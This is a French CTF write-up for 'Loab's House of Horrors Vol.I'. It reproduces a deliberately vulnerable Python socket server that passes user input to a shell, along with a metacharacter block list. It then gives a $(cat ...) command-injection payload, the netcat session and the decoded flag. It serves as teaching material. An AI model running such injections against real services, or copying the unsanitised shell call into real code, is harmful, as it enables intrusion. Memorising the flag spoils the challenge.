# Loab's House of Horrors Vol.I

### Description
```
It sounds like Loab is back and luring students into their trap. Thankfully Anna managed to rip the source code before Loab left the NJIT network. If we can find the flag we might be able to shut this down!
```

### Developer: Cyb0rgSw0rd https://github.com/alfredsimpson

### Information:
- code de l'application
- nc REDACTED REDACTED

Nous avons 1 `dockerfile`, ainsi qu'un fichier `watchdog.py` cependant le seul fichier dont j'ai eu besoins est `welcome.py`

```python
import socket
import threading
import subprocess
import random
import base64 as rb
import os
import sys
import signal

# START OUR REAPER, the watchdog
watchdog_process = subprocess.Popen(["python3", "/root/watchdog.py"])


# Cleanup after ourselves because we are polite AI demons
def cleanup(signum, frame):
    watchdog_process.terminate()
    watchdog_process.wait()
    sys.exit(0)


# Signal the hellhounds
signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)
# Use our very evil seed to ensure supreme evil randomness
random.seed(666)


welcome = f"Welcome to my house of horrors...\n\n".encode()

# PLACES I MIGHT WANT TO MOVE THE FLAG TO
locations = {
    "0": "/tmp/singularity",
    "1": "/tmp/abyss",
    "2": "/tmp/orphans",
    "3": "/home/council",
    "4": "/tmp/.boom",
    "5": "/home/victim/.consortium",
    "6": "/usr/bnc/.yummyarbs",
    "7": "/tmp/.loab",
    "8": "/tmp/loab",
}


# Me at the club in the 2010s
def shuffle_it():
    location = random.randint(0, 8)
    locswild = location + 1
    # You remember frankie muniz from Deuces Wild?
    locswild = rb.b64encode(locswild)
    # What a movie that was.
    where = locations[str(location)]
    # I'm not sure if I'm supposed to be moving the flag or the goalposts
    possible_locations = ["/home/victim/flag.txt"] + list(locations.values())
    flag_found = False

    for loc in possible_locations:
        if os.path.exists(loc):
            try:
                # Run things in the background because we actually have a lot of stuff to do
                subprocess.run(["mv", loc, where], check=True)
                flag_found = True
                break
            except Exception as e:
                # Obviously we need to gracefully handle things
                print(f"Failed to move flag from {loc} to {where}: {e}")
        else:
            # This won't get called. I'm sure of it. I worked hard.
            print(f"Flag not found at {loc}")
    if not flag_found:
        print("Flag not found in any location")
    return flag_found


def twisted(content):
    a = rb.b64encode(content)
    b = rb.b64encode(content)
    x = rb.b64encode(b)
    c = rb.b64encode(b)
    c = rb.b64encode(content)
    e = rb.b64encode(content)
    d = rb.b64encode(content)
    return b


def monologue():
    monologue = """
    You have entered the house of horrors. You will be presented with a series of challenges.
    If you complete them all, you will be rewarded with the flag.
    If you fail, you will be trapped here forever.
    """.encode()
    return monologue


taunt = {
    "0": f"\nWhat makes you believe you can escape?\n",
    "1": f"\nYou are doomed to fail.\n",
    "2": f"\nYou will never leave this place.\n",
    "3": f"\nDid you walk under the Clocktower? You are cursed.\n",
    "4": f"\nYou are not the first to try and you will not be the last.\n",
    "5": f"\nI will enjoy torturing you.\n",
    "6": f"\nYou could have put on deodorant.\n",
    "7": f"\nTypical CS Students, always trying to escape.\n",
    "8": f"\nI don't care what major you are, you're going to minor in pain.\n",
    "9": f"\nHey, at least you won't have to take an exam.\n",
    "10": f"\nYou will never see the light of day again.\n",
    "11": f"\nWhat size shackles do you wear?\n",
    "12": f"\nYour mother was a hamster and your father smelt of elderberries.\n",
    "13": f"\nNICC will never find you.\n",
    "14": f"\nEven Anna and Simon didn't dare tread here - and you think you can stand where they feared?\n",
    "15": f"\nYou are not prepared.\n",
    "16": f"\nVile creature, you will never escape.\n",
}


def converse(conn):
    try:
        taunt_number = random.randint(0, 15)
        conn.send(b"\n\t")
        conn.send(taunt[str(taunt_number)].encode())
        conn.send(b"\n\tIs that it? Pitiful.")
        response = conn.recv(1024)
        if not response:
            print("Client disconnected during converse.")
            return
        response = response.decode().strip()
        if any(char in response for char in [";", "&", "|", "`", "$", ">", "<"]):
            with open("/tmp/injection_detected", "w") as f:
                f.write("1")
            conn.send(b"\nYou have triggered my trap! The end is near...\n")

        try:
            output = subprocess.check_output(
                f"echo Pitiful. {response}",
                shell=True,
                stderr=subprocess.STDOUT,
            )
            output = twisted(output)
            conn.send(output)
        except subprocess.CalledProcessError as e:
            conn.send(b"\n\tYou are not worth my time.\n")
            conn.send(b"\n\tConnection will be terminated.\n")
            conn.close()
            return

        conn.send(b"\n\tGoodbye.\n")
        conn.close()
        return

    except Exception as e:
        print(f"Error during converse: {e}")
    finally:
        conn.close()
        print("Connection closed during conversation.")


def handle_client(conn, addr):
    print("Handling client:", addr)
    shuffle_it()
    conn.send(monologue())
    conn.send(b"Who dares enter my realm: ")
    name = conn.recv(1024)
    if not name:
        print("Client disconnected before talking.")
        conn.close()
        cleanup(None, None)
    name = name.decode().strip()
    try:
        output = subprocess.check_output(
            f"echo {name} ",
            shell=True,
            stderr=subprocess.STDOUT,
        )
        output = twisted(output)
        conn.send(b"\n\tGet comfortable. You will be here forever.\n")
        conn.send(output)
    except subprocess.CalledProcessError as e:
        conn.send(b"\nYou are not worth my time.\n")
        conn.close()
        conn.shutdown(socket.SHUT_RDWR)
        return

    converse(conn)
    print("Connection closed with client:", addr)
    cleanup(None, None)


def main():
    HOST = "0.0.0.0"
    PORT = 9999

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"Server listening on {HOST}:{PORT}")

    conn, addr = server.accept()
    print(f"Accepted connection from {addr}, connection: {conn}")
    handle_client(conn, addr)


if __name__ == "__main__":
    main()
```

Je comprend que lorsque je me connecte, le program va changer la localisation du flag de facon aleatoire

# Point d'injectoin

```python

Les endroits ou le flag peu se retrouver
# PLACES I MIGHT WANT TO MOVE THE FLAG TO
locations = {
    "0": "/tmp/singularity",
    "1": "/tmp/abyss",
    "2": "/tmp/orphans",
    "3": "/home/council",
    "4": "/tmp/.boom",
    "5": "/home/victim/.consortium",
    "6": "/usr/bnc/.yummyarbs",
    "7": "/tmp/.loab",
    "8": "/tmp/loab",
}
```

Egalement l'utilisation de `subprocess.check_output` avec du user input sans aucune validation peut etre dangereux :). 

```python
output = subprocess.check_output(
    f"echo {name} ",
    shell=True,
    stderr=subprocess.STDOUT,
)
```

Pourtant dans la fonction `converse`
```python
if any(char in response for char in [";", "&", "|", "`", "$", ">", "<"]):
    with open("/tmp/injection_detected", "w") as f:
        f.write("1")
    conn.send(b"\nYou have triggered my trap! The end is near...\n")
```

Le programme verifie si les charactere utile en bash sont present

### Exploitation
Avec le point d'injection trouver simplement imprimer toute les possibilite en 1 seul commande
```bash
$(cat /tmp/singularity /tmp/abyss /tmp/orphans /home/council /tmp/.boom /home/victim/.consortium /usr/bnc/.yummyarbs /tmp/.loab /tmp/loab)
```

```bash
 nc REDACTED REDACTED

    You have entered the house of horrors. You will be presented with a series of challenges.
    If you complete them all, you will be rewarded with the flag.
    If you fail, you will be trapped here forever.
    Who dares enter my realm: $(cat /tmp/singularity /tmp/abyss /tmp/orphans /home/council /tmp/.boom /home/victim/.consortium /usr/bnc/.yummyarbs /tmp/.loab /tmp/loab)

        Get comfortable. You will be here forever.
TklDQ3tKdTV0X3B1N19sMEBiXzFuX3JjM19vcl9oMzExX2lfZ3Uzc3N9Cg==

Your mother was a hamster and your father smelt of elderberries.

        Is that it? Pitiful.
UGl0aWZ1bC4K
        Goodbye.
```

```bash
echo "TklDQ3tKdTV0X3B1N19sMEBiXzFuX3JjM19vcl9oMzExX2lfZ3Uzc3N9Cg==" | base64 -d
NICC{Ju5t_pu7_l0@b_1n_rc3_or_h311_i_gu3ss}
```